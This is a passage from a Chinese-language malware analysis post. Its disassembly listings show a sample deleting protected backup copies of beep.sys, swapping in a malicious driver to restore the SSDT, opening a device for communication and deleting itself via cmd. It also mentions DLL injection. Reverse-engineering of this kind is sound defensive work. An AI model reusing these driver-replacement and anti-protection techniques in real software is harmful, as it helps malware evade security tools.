
```
unpacked:0040177C             push offset aStopserviceFai  ; "StopService failed in LoadDirv."

unpacked:00401781             call OutputDebugStringA

unpacked:00401787             or  eax, 0FFFFFFFFh

unpacked:0040178A             jmp loc_4018AC

unpacked:0040178F ; ---------------------------------------------------------------------------

unpacked:0040178F

unpacked:0040178F loc_40178F:                 ; CODE XREF: LoadDriver+83j

unpacked:0040178F             and [ebp+FileName], 0

unpacked:00401796             push ebx

unpacked:00401797             push 40h

unpacked:00401799             xor eax, eax

unpacked:0040179B             pop ecx

unpacked:0040179C             lea edi, [ebp+var_137]

unpacked:004017A2             rep stosd

unpacked:004017A4             stosw

unpacked:004017A6             stosb

unpacked:004017A7             mov edi, GetSystemDirectoryA

unpacked:004017AD             mov esi, 104h

unpacked:004017B2             lea eax, [ebp+FileName]

unpacked:004017B8             push esi          ; uSize

unpacked:004017B9             push eax          ; lpBuffer

unpacked:004017BA             call edi ; GetSystemDirectoryA

unpacked:004017BC             lea eax, [ebp+FileName]

unpacked:004017C2             push offset aDllcacheBeep_s ; "\\\\dllcache\\\\beep.sys"

unpacked:004017C7             push eax

unpacked:004017C8             call _mbscat

unpacked:004017CD             mov ebx, DeleteFileA

unpacked:004017D3             pop ecx

unpacked:004017D4             pop ecx

unpacked:004017D5             lea eax, [ebp+FileName]

unpacked:004017DB             push eax          ; lpFileName

unpacked:004017DC             call ebx ; DeleteFileA ; 删掉 dllcache 中的备份文件 .防止替换失败. 原来 dllcache 这个目录里面还有备份.

unpacked:004017DE             push esi          ; Size

unpacked:004017DF             lea eax, [ebp+FileName]

unpacked:004017E5             push 0            ; Val

unpacked:004017E7             push eax          ; Dst

unpacked:004017E8             call memset

unpacked:004017ED             add esp, 0Ch

unpacked:004017F0             lea eax, [ebp+FileName]

unpacked:004017F6             push esi          ; uSize

unpacked:004017F7             push eax          ; lpBuffer

unpacked:004017F8             call GetWindowsDirectoryA

unpacked:004017FE             lea eax, [ebp+FileName]

unpacked:00401804             push offset aDriverCacheI38 ; "\\\\Driver Cache\\\\i386\\\\driver.cab"

unpacked:00401809             push eax

unpacked:0040180A             call _mbscat

unpacked:0040180F             pop ecx

unpacked:00401810             lea eax, [ebp+FileName]

unpacked:00401816             pop ecx

unpacked:00401817             push eax          ; lpFileName

unpacked:00401818             call ebx ; DeleteFileA ; 按程序的意图, 貌似这个 driver.cab 也备份了那个 beep.sys

unpacked:0040181A             push esi          ; uSize

unpacked:0040181B             mov esi, offset FileName

unpacked:00401820             push esi          ; lpBuffer

unpacked:00401821             call edi ; GetSystemDirectoryA

unpacked:00401823             lea eax, [ebp+var_34]

unpacked:00401826             push eax

unpacked:00401827             push esi

unpacked:00401828             call lstrcat

unpacked:0040182E             push 80h          ; dwFileAttributes

unpacked:00401833             push esi          ; lpFileName

unpacked:00401834             call SetFileAttributesA

unpacked:0040183A             push offset nNumberOfBytesToWrite ; NumberOfBytesRead

unpacked:0040183F             push esi          ; lpFileName

unpacked:00401840             call GetBufffromFile ; 文件数据读到一个缓冲区, 并返回指针.

unpacked:00401845             pop ecx

unpacked:00401846             xor edi, edi

unpacked:00401848             cmp nNumberOfBytesToWrite, edi

unpacked:0040184E             pop ecx

unpacked:0040184F             mov lpBuffer, eax

unpacked:00401854             pop ebx

unpacked:00401855             jz  short loc_401892

unpacked:00401857             push esi          ; lpFileName

unpacked:00401858             push offset aSys  ; "SYS"

unpacked:0040185D             push 87h          ; lpBuffer

unpacked:00401862             push [ebp+hModule] ; hModule

unpacked:00401865             call ReleaseRes_2 ; 释放恶意驱动---以恢复 SSDT

unpacked:0040186A             add esp, 10h

unpacked:0040186D             test eax, eax

unpacked:0040186F             jnz short loc_401878

unpacked:00401871             push offset aModifyfromreso ; "ModifyFromResource falied."

unpacked:00401876             jmp short loc_40188C

unpacked:00401878 ; ---------------------------------------------------------------------------

unpacked:00401878

unpacked:00401878 loc_401878:                 ; CODE XREF: LoadDriver+178j

unpacked:00401878             push offset ServiceName ; lpServiceName

unpacked:0040187D             call StartService ; 替换完毕, 启动我们的服务, 准备恢复 SSDT 表.

unpacked:00401882             test al, al

unpacked:00401884             pop ecx

unpacked:00401885             jnz short loc_401896

unpacked:00401887             push offset aStartserviceFa ; "StartService failed in LoadDirv."

unpacked:0040188C

unpacked:0040188C loc_40188C:                 ; CODE XREF: LoadDriver+17Fj

unpacked:0040188C             call OutputDebugStringA

unpacked:00401892

unpacked:00401892 loc_401892:                 ; CODE XREF: LoadDriver+15Ej

unpacked:00401892             xor eax, eax

unpacked:00401894             jmp short loc_4018AC

unpacked:00401896 ; ---------------------------------------------------------------------------

unpacked:00401896

unpacked:00401896 loc_401896:                 ; CODE XREF: LoadDriver+18Ej

unpacked:00401896             push edi          ; hTemplateFile

unpacked:00401897             push edi          ; dwFlagsAndAttributes

unpacked:00401898             push 3            ; dwCreationDisposition

unpacked:0040189A             push edi          ; lpSecurityAttributes

unpacked:0040189B             push edi          ; dwShareMode

unpacked:0040189C             push 0C0000000h   ; dwDesiredAccess

unpacked:004018A1             push offset a_Ressdtdos ; "\\\\\\\\.\\\\RESSDTDOS"

unpacked:004018A6

unpacked:004018A6 loc_4018A6:                 ; DATA XREF: unpacked:0040A0DFo

unpacked:004018A6             call CreateFileA  ; 打开设备.进行通信
```

`... ...`

关于 `SSDT` 恢复部分的, 这里就不多贴了, 免得占版面. (我会在附件中打包 `idb` 文件)

我们再看其他的部分.

`... ...`

进程注射作者使用的是最简单的 `dll` 远程线程注射. 没什么新意, 我就不贴反汇编代码了.

自删除部分也是使用的最常用的方法, 通过创建一个 `cmd` 进程, 并设置进程优先级来达到目的. 如下:

`... ...`

```
unpacked:00401100             mov esi, 104h

unpacked:00401105             lea eax, [ebp+szLongPath]

unpacked:0040110B             push esi          ; nSize

unpacked:0040110C             push eax          ; lpFilename

unpacked:0040110D             push 0            ; hModule

unpacked:0040110F             call GetModuleFileNameA

unpacked:00401115             test eax, eax

unpacked:00401117             jz  loc_4011F4

unpacked:0040111D             lea eax, [ebp+szLongPath]

unpacked:00401123             push esi          ; cchBuffer

unpacked:00401124             push eax          ; lpszShortPath

unpacked:00401125             lea eax, [ebp+szLongPath]

unpacked:0040112B             push eax          ; lpszLongPath

unpacked:0040112C             call GetShortPathNameA

unpacked:00401132             test eax, eax

unpacked:00401134             jz  loc_4011F4

unpacked:0040113A             lea eax, [ebp+Buffer]

unpacked:00401140             push esi          ; nSize
```
